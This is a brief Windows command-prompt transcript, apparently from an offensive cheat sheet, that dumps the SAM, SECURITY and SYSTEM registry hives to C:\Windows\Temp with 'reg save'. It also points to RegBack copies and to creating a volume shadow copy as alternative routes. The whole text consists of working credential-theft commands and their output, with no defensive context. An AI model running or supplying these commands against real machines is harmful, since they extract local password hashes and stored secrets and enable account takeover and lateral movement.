:: Offline capture of the three hives that hold local secrets.
:: Run from an elevated / SYSTEM context. Hives are locked while online, so
:: `reg save` (uses the backup privilege) or a VSS copy is the usual route.

C:\Windows\system32> reg save HKLM\SAM      C:\Windows\Temp\sam.hive
The operation completed successfully.

C:\Windows\system32> reg save HKLM\SECURITY C:\Windows\Temp\security.hive
The operation completed successfully.

C:\Windows\system32> reg save HKLM\SYSTEM   C:\Windows\Temp\system.hive
The operation completed successfully.

C:\Windows\system32> dir C:\Windows\Temp\*.hive

::   C:\Windows\System32\config\RegBack\{SAM,SECURITY,SYSTEM}

:: Or from a shadow copy:
C:\> vssadmin create shadow /for=C:
